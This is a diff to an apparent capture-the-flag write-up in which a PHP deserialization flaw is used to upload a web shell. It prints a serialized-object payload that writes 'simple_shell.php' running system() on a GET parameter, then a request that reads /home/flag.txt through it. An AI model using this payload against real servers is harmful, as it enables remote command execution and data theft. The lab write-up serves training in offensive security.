@@ -51,10 +51,10 @@ Using the "universe.txt" write a script that upload a malicious file.
 I wrote the "deserialise.php" which serialize the malicous "simple_shell.php"
 
 ### Uploading the "simple_shell.php" in the webserver.
-http://<url>/s3r1al1z3.php?universe=O:4:"File":2:{s:8:"filename";s:16:"simple_shell.php";s:7:"content";s:35:"<?php echo system($_GET['cmd']); ?>";}
+http://192.168.125.11:5052/s3r1al1z3.php?universe=O:4:%22File%22:2:{s:8:%22filename%22;s:16:%22simple_shell.php%22;s:7:%22content%22;s:35:%22%3C?php%20echo%20system($_GET[%27cmd%27]);%20?%3E%22;}
 
 ### Retrieve the flag
-http://<url>/simple_shell.php?cmd=cat /home/flag.txt
+http://192.168.125.11:5052/simple_shell.php?cmd=cat%20/home/flag.txt
 
 
 </details>
